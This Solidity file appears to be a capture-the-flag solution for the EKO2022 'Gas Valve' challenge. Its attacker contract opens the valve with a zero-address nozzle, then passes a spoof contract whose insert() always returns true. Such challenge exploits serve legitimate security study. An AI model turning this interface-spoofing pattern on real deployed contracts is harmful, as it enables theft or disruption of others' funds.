// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Valve, INozzle} from "../../src/eko2022/11_GasValve/GasValve.sol";

contract GasValve_Attakcer {
	address player;
	Valve valve;
	
	constructor(Valve valve_) {
		player = msg.sender;
		valve = valve_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		INozzle iNozzle = INozzle(address(0));
		valve.openValve(iNozzle);
		
		Simulator simulatorContract = new Simulator();
		valve.useNozzle(INozzle(address(simulatorContract)));
	}
}

contract Simulator {
	function insert() external pure returns (bool) {
		return true;
	}
}
